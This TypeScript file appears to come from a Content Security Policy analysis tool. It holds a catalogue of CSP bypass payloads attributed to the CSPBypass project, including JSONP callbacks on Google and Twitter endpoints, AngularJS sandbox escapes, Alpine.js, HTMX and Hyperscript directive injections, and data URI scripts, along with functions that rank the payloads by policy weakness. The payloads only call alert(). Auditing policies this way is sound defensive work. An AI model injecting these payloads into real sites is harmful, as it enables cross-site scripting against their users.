export interface BypassPayload {
  id: string;
  name: string;
  technique: string;
  payload: string;
  description: string;
  difficulty: "easy" | "medium" | "hard";
  requirements?: string[];
  domain?: string;
  source: "cspbypass" | "generic";
}

// Real bypass payloads from CSPBypass project (https://github.com/renniepak/CSPBypass)
export const bypassPayloads: Record<string, BypassPayload[]> = {
  "script-wildcard": [
    {
      id: "googleapis-jsonp",
      name: "Google APIs JSONP Callback",
      technique: "JSONP",
      payload:
        '<script src="https://maps.googleapis.com/maps/api/js?callback=alert"></script>',
      description: "Uses Google Maps API JSONP callback to execute JavaScript",
      difficulty: "easy",
      domain: "maps.googleapis.com",
      source: "cspbypass",
    },
    {
      id: "google-translate-jsonp",
      name: "Google Translate JSONP",
      technique: "JSONP",
      payload:
        '<script src="https://translate.google.com/translate_a/element.js?cb=alert"></script>',
      description: "Exploits Google Translate API JSONP endpoint",
      difficulty: "easy",
      domain: "translate.google.com",
      source: "cspbypass",
    },
    {
      id: "gstatic-angular",
      name: "Google Static AngularJS",
      technique: "AngularJS",
      payload:
        "<img src=x ng-focus=\"$event.composedPath()|orderBy:'[].constructor.from([1],alert)'\">",
      description: "AngularJS expression injection via Google Static CDN",
      difficulty: "medium",
      domain: "ssl.gstatic.com",
      source: "cspbypass",
      requirements: ["AngularJS on page"],
    },
    {
      id: "jsdelivr-alpine",
      name: "jsDelivr Alpine.js XSS",
      technique: "Alpine.js",
      payload: '<div x-init="alert(1)"></div>',
      description: "Alpine.js directive injection via jsDelivr CDN",
      difficulty: "easy",
      domain: "cdn.jsdelivr.net",
      source: "cspbypass",
      requirements: ["Alpine.js library loaded"],
    },
  ],
  "script-unsafe-inline": [
    {
      id: "angular-ng-onerror",
      name: "AngularJS ng-on-error",
      technique: "AngularJS",
      payload: '<img src=x ng-on-error="window.alert(window.origin)">',
      description: "AngularJS directive event handler injection",
      difficulty: "easy",
      source: "cspbypass",
      requirements: ["AngularJS on page"],
    },
    {
      id: "htmx-trigger",
      name: "HTMX Trigger XSS",
      technique: "HTMX",
      payload: '<any hx-trigger="x[1)}),alert(origin)//]">',
      description: "HTMX trigger attribute injection",
      difficulty: "medium",
      domain: "cdn.jsdelivr.net",
      source: "cspbypass",
      requirements: ["HTMX library loaded"],
    },
    {
      id: "hyperscript-xss",
      name: "Hyperscript XSS",
      technique: "Hyperscript",
      payload: '<x _="on load alert(1)">',
      description: "Hyperscript directive injection",
      difficulty: "easy",
      domain: "unpkg.com",
      source: "cspbypass",
      requirements: ["Hyperscript library loaded"],
    },
  ],
  "script-unsafe-eval": [
    {
      id: "eval-injection",
      name: "Direct Eval",
      technique: "Dynamic Code",
      payload: 'eval("alert(document.domain)")',
      description: "Direct eval() function exploitation",
      difficulty: "easy",
      source: "generic",
    },
    {
      id: "function-constructor",
      name: "Function Constructor",
      technique: "Dynamic Code",
      payload: 'new Function("alert", "alert(document.domain)")(alert)',
      description: "Function constructor code execution",
      difficulty: "medium",
      source: "generic",
    },
  ],
  "jsonp-bypass-risk": [
    {
      id: "google-search-suggest",
      name: "Google Search Suggestions",
      technique: "JSONP",
      payload:
        '<script src="https://suggestqueries.google.com/complete/search?callback=alert&client=chrome"></script>',
      description: "Google search suggestions JSONP callback exploitation",
      difficulty: "easy",
      domain: "suggestqueries.google.com",
      source: "cspbypass",
    },
    {
      id: "twitter-api-jsonp",
      name: "Twitter API JSONP",
      technique: "JSONP",
      payload:
        '<script src="https://api.twitter.com/1.1/users/show.json?callback=alert"></script>',
      description: "Twitter API JSONP endpoint exploitation",
      difficulty: "easy",
      domain: "api.twitter.com",
      source: "cspbypass",
    },
  ],
  "angularjs-bypass": [
    {
      id: "angular-constructor-bypass",
      name: "AngularJS Constructor Bypass",
      technique: "AngularJS",
      payload: '{{constructor.constructor("alert(document.domain)")()}}',
      description: "AngularJS sandbox escape via constructor chain",
      difficulty: "hard",
      source: "cspbypass",
      requirements: ["AngularJS 1.x", "Template injection point"],
    },
    {
      id: "angular-orderby-bypass",
      name: "AngularJS OrderBy Filter Bypass",
      technique: "AngularJS",
      payload: "{{ [].constructor.from([1],alert) }}",
      description: "AngularJS filter exploitation for code execution",
      difficulty: "hard",
      source: "cspbypass",
      requirements: ["AngularJS 1.x", "Filter injection point"],
    },
  ],
  "script-data-uri": [
    {
      id: "data-script-basic",
      name: "Data URI Script",
      technique: "Data URI",
      payload:
        '<script src="data:text/javascript,alert(document.domain)"></script>',
      description: "Execute JavaScript via data URI scheme",
      difficulty: "easy",
      source: "generic",
    },
  ],
  "object-wildcard": [
    {
      id: "object-data-html",
      name: "Object Data HTML",
      technique: "Object Embed",
      payload:
        '<object data="data:text/html,<script>alert(document.domain)</script>"></object>',
      description: "Embed executable HTML content via object tag",
      difficulty: "medium",
      source: "generic",
    },
  ],
  "style-unsafe-inline": [
    {
      id: "css-import-js",
      name: "CSS Import JavaScript",
      technique: "CSS Injection",
      payload: '<style>@import "javascript:alert(document.domain)";</style>',
      description: "CSS import statement JavaScript execution",
      difficulty: "medium",
      source: "generic",
      requirements: ["Older browsers"],
    },
  ],
};

export const getBypassesForVulnerability = (
  vulnerabilityType: string,
  fullDatabase?: unknown[],
): BypassPayload[] => {
  // Get curated specific bypasses for this vulnerability type
  const specificBypasses = bypassPayloads[vulnerabilityType] || [];

  // If we have the full database, filter it for additional relevant bypasses
  if (fullDatabase && fullDatabase.length > 0) {
    const additionalBypasses = filterDatabaseByVulnerabilityType(
      vulnerabilityType,
      fullDatabase,
    );

    // Combine curated bypasses with filtered database entries
    // Remove duplicates based on payload content
    const combined = [...specificBypasses];
    const existingPayloads = new Set(specificBypasses.map((bp) => bp.payload));

    for (const dbBypass of additionalBypasses) {
      if (!existingPayloads.has(dbBypass.payload)) {
        combined.push(dbBypass);
        existingPayloads.add(dbBypass.payload);
      }
    }

    return combined.slice(0, 10); // Limit to top 10 most relevant
  }

  return specificBypasses;
};

const filterDatabaseByVulnerabilityType = (
  vulnerabilityType: string,
  database: unknown[],
): BypassPayload[] => {
  const filtered: BypassPayload[] = [];

  for (const entry of database) {
    let relevanceScore = 0;
    let difficulty: "easy" | "medium" | "hard" = "medium";

    // Smart filtering based on vulnerability type
    switch (vulnerabilityType) {
      case "script-wildcard":
      case "script-unsafe-inline":
        if (
          typeof entry === "object" &&
          entry !== null &&
          "technique" in entry &&
          (entry.technique === "AngularJS" ||
            entry.technique === "Script Injection" ||
            entry.technique === "Event Handler" ||
            entry.technique === "Alpine.js" ||
            entry.technique === "HTMX")
        ) {
          relevanceScore = entry.technique === "AngularJS" ? 10 : 8;
          difficulty = entry.technique === "Event Handler" ? "easy" : "medium";
        }
        break;

      case "jsonp-bypass-risk":
        if (
          typeof entry === "object" &&
          entry !== null &&
          "technique" in entry &&
          entry.technique === "JSONP"
        ) {
          relevanceScore = 10;
          difficulty = "easy";
        }
        break;

      case "angularjs-bypass":
        if (entry.technique === "AngularJS") {
          relevanceScore = 10;
          difficulty = "hard";
        }
        break;

      case "script-unsafe-eval":
        if (
          typeof entry === "object" &&
          entry !== null &&
          "technique" in entry &&
          "code" in entry &&
          (entry.technique === "Script Injection" ||
            (typeof entry.code === "string" && entry.code.includes("eval")))
        ) {
          relevanceScore = 8;
          difficulty = "medium";
        }
        break;

      case "object-wildcard":
        if (
          typeof entry === "object" &&
          entry !== null &&
          "technique" in entry &&
          "code" in entry &&
          (entry.technique === "Iframe Injection" ||
            (typeof entry.code === "string" && entry.code.includes("<iframe")))
        ) {
          relevanceScore = 8;
          difficulty = "medium";
        }
        break;

      case "style-unsafe-inline":
        if (
          typeof entry === "object" &&
          entry !== null &&
          "technique" in entry &&
          "code" in entry &&
          (entry.technique === "Link Preload" ||
            (typeof entry.code === "string" && entry.code.includes("<link")))
        ) {
          relevanceScore = 8;
          difficulty = "medium";
        }
        break;

      default:
        // Generic scoring for other vulnerability types
        if (
          entry.technique === "Script Injection" ||
          entry.technique === "XSS"
        ) {
          relevanceScore = 5;
        }
    }

    if (relevanceScore > 0) {
      filtered.push({
        id: `db-${entry.id}`,
        name: `${entry.domain} ${entry.technique}`,
        technique: entry.technique,
        payload: entry.code,
        description: `${entry.technique} bypass using ${entry.domain}`,
        difficulty,
        domain: entry.domain,
        source: "cspbypass",
        relevanceScore,
      } as BypassPayload & { relevanceScore: number });
    }
  }

  // Sort by relevance score and return top matches
  return (filtered as (BypassPayload & { relevanceScore: number })[])
    .sort((a, b) => b.relevanceScore - a.relevanceScore)
    .map(({ relevanceScore, ...bypass }) => bypass as BypassPayload);
};

export const getDifficultyColor = (difficulty: string): string => {
  switch (difficulty) {
    case "easy":
      return "success";
    case "medium":
      return "warning";
    case "hard":
      return "danger";
    default:
      return "secondary";
  }
};
